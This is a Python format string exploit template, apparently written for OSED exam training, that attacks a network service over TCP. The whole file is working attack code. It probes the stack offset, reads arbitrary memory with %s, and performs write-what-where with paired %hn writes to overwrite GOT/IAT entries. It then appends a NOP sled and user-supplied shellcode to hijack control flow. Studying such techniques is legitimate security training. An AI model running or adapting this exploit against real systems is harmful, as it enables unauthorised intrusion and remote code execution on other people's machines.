#!/usr/bin/env python3
"""Format string exploit template.

OSED Modules 12-13 cover format string attacks. This template handles:
  - Stack reading (%x / %p) to find offsets and leak addresses
  - Arbitrary write via %n (write-what-where)
  - GOT/IAT overwrite for control flow hijack

The format string position (which %x hits your controlled input) must
be found empirically. This script helps automate that.

Run on Kali:
  python3 format_string.py
"""
import socket
import struct
import sys

# ============================================================
# FILL THESE IN
# ============================================================
MODE = "probe"          # probe | read | write | exploit

TARGET_HOST = "192.168.x.x"
TARGET_PORT = 9999
PROTOCOL    = "tcp"

PREFIX = b""
SUFFIX = b""

BADCHARS = [0x00]

# --- Format string position ---
# The stack position where your input starts appearing.
# Use "probe" mode to find this: look for 41414141 in the output.
FMT_OFFSET = 0          # e.g., 7 means the 7th %x hits your buffer

# --- Read mode ---
# Address to read from (leaked as hex via %s or %x).
READ_ADDR = 0x00000000

# --- Write mode ---
# Arbitrary write: write WRITE_VALUE to WRITE_ADDR using %n.
# Uses the classic two-short-write technique (two %hn writes).
WRITE_ADDR  = 0x00000000    # target address (e.g., GOT entry)
WRITE_VALUE = 0x00000000    # 4-byte value to write

# --- Exploit mode ---
# After the format string write redirects execution:
# Shellcode -- three options (tried in order):
#   1. SHELLCODE_ASM: Keystone assembly (requires keystone-engine)
#   2. SHELLCODE_FILE: path to shellcode.bin
#   3. SHELLCODE: raw bytes pasted inline
SHELLCODE_ASM = r"""
"""
SHELLCODE_FILE = ""
SHELLCODE = b""


# ============================================================
# TRANSPORT
# ============================================================
def tcp_exchange(data, recv_size=4096, timeout=5.0):
    payload = PREFIX + data + SUFFIX
    print(f"[*] Sending {len(payload)} bytes...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((TARGET_HOST, TARGET_PORT))
        # banner = s.recv(1024)
        s.sendall(payload)
        try:
            resp = b""
            while True:
                chunk = s.recv(recv_size)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
    return resp


# ============================================================
# SHELLCODE ASSEMBLY (Keystone)
# ============================================================
def assemble_ks(asm_text):
    try:
        from keystone import Ks, KS_ARCH_X86, KS_MODE_32
    except ImportError:
        print("[-] keystone-engine not installed (pip install keystone-engine)")
        sys.exit(1)
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    cleaned = asm_text.replace("jmp short ", "jmp ")
    try:
        encoding, count = ks.asm(cleaned)
    except Exception as e:
        print(f"[-] Assembly failed: {e}")
        sys.exit(1)
    sc = bytes(encoding)
    print(f"[+] Assembled {count} instructions -> {len(sc)} bytes")
    return sc


def get_shellcode():
    asm = SHELLCODE_ASM.strip()
    if asm:
        return assemble_ks(asm)
    if SHELLCODE_FILE:
        with open(SHELLCODE_FILE, "rb") as f:
            sc = f.read()
        print(f"[+] Loaded {len(sc)} bytes from {SHELLCODE_FILE}")
        return sc
    if SHELLCODE:
        return SHELLCODE
    print("[-] No shellcode. Set SHELLCODE_ASM, SHELLCODE_FILE, or SHELLCODE.")
    sys.exit(1)


def send_payload(data):
    payload = PREFIX + data + SUFFIX
    print(f"[*] Payload: {len(payload)} bytes")

    if PROTOCOL == "tcp":
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5.0)
            s.connect((TARGET_HOST, TARGET_PORT))
            s.sendall(payload)
        return

    if PROTOCOL == "file":
        with open("fmt_payload.bin", "wb") as f:
            f.write(payload)
        print("[+] Written to fmt_payload.bin")
        return


# ============================================================
# FORMAT STRING HELPERS
# ============================================================
def probe_format_string(count=30):
    """Send AAAA + %08x. * count and look for 41414141 in output."""
    marker = b"AAAA"
    fmt = b".%08x" * count
    resp = tcp_exchange(marker + fmt)
    text = resp.decode("latin-1")
    print(f"[*] Response:\n{text}\n")

    parts = text.split(".")
    for i, part in enumerate(parts):
        part = part.strip()
        if "41414141" in part.lower():
            print(f"[+] Found marker at position {i}")
            print(f"    FMT_OFFSET = {i}")
            return i

    print("[-] Marker 41414141 not found. Try increasing count or check prefix.")
    return -1


def build_read_payload(addr, position):
    """Read 4 bytes from addr using %s at the given stack position."""
    # Place the address at a known position in the format string,
    # then use %<position>$s to dereference it.
    payload = struct.pack("<I", addr)
    payload += f"%{position}$s".encode()
    return payload


def build_write_payload(addr, value, position):
    """Write a 4-byte value to addr using two %hn writes.

    This uses the classic two-write technique:
      - Write low 2 bytes to addr
      - Write high 2 bytes to addr+2
    """
    lo = value & 0xFFFF
    hi = (value >> 16) & 0xFFFF

    # We need two addresses in the buffer: addr and addr+2
    addr_lo = struct.pack("<I", addr)
    addr_hi = struct.pack("<I", addr + 2)

    # 8 bytes of addresses already printed
    already_printed = 8

    # Calculate padding for each %hn
    # First write: lo bytes
    pad1 = (lo - already_printed) % 0x10000
    # Second write: hi bytes
    pad2 = (hi - lo) % 0x10000

    # Position references (the two addresses are at position and position+1)
    fmt = addr_lo + addr_hi
    if pad1 > 0:
        fmt += f"%{pad1}x".encode()
    fmt += f"%{position}$hn".encode()
    if pad2 > 0:
        fmt += f"%{pad2}x".encode()
    fmt += f"%{position + 1}$hn".encode()

    return fmt


# ============================================================
# MODES
# ============================================================
def do_probe():
    print("[*] Probing format string offset...")
    probe_format_string()

def do_read():
    if READ_ADDR == 0:
        print("[-] Set READ_ADDR first.")
        sys.exit(1)
    if FMT_OFFSET == 0:
        print("[-] Set FMT_OFFSET first (use probe mode).")
        sys.exit(1)

    print(f"[*] Reading from 0x{READ_ADDR:08x} at position {FMT_OFFSET}")
    payload = build_read_payload(READ_ADDR, FMT_OFFSET)
    resp = tcp_exchange(payload)
    print(f"[*] Response ({len(resp)} bytes):")
    print(f"    hex: {resp.hex()}")
    print(f"    raw: {resp}")

def do_write():
    if WRITE_ADDR == 0 or WRITE_VALUE == 0:
        print("[-] Set WRITE_ADDR and WRITE_VALUE first.")
        sys.exit(1)
    if FMT_OFFSET == 0:
        print("[-] Set FMT_OFFSET first (use probe mode).")
        sys.exit(1)

    print(f"[*] Writing 0x{WRITE_VALUE:08x} to 0x{WRITE_ADDR:08x}")
    payload = build_write_payload(WRITE_ADDR, WRITE_VALUE, FMT_OFFSET)
    print(f"[*] Format string payload: {len(payload)} bytes")
    resp = tcp_exchange(payload)
    print(f"[*] Done. Check the target.")

def do_exploit():
    if WRITE_ADDR == 0:
        print("[-] Set WRITE_ADDR (e.g., GOT entry to overwrite).")
        sys.exit(1)

    # For a full exploit, you typically:
    # 1. Use the format string to overwrite a GOT/IAT entry with a
    #    stack address or gadget address
    # 2. The next call to that function jumps to your shellcode
    #
    # If shellcode is in the buffer itself, WRITE_VALUE should point
    # to where the shellcode lands in memory. You may need a leak first
    # (combine with aslr_leak.py techniques).

    if not SHELLCODE_ASM.strip() and not SHELLCODE_FILE and not SHELLCODE:
        print("[*] No shellcode -- sending write-only payload")
        do_write()
        return
    sc = get_shellcode()

    # Place shellcode after the format string.
    # Adjust WRITE_VALUE to point to where this lands in memory.
    fmt = build_write_payload(WRITE_ADDR, WRITE_VALUE, FMT_OFFSET)
    payload = fmt + b"\x90" * 16 + sc
    print(f"[*] Exploit payload: {len(payload)} bytes (fmt: {len(fmt)}, sc: {len(sc)})")
    send_payload(payload)


MODES = {
    "probe": do_probe,
    "read": do_read,
    "write": do_write,
    "exploit": do_exploit,
}

if __name__ == "__main__":
    mode = MODE.lower()
    if mode not in MODES:
        print(f"[-] Unknown mode: {mode}")
        sys.exit(1)
    MODES[mode]()
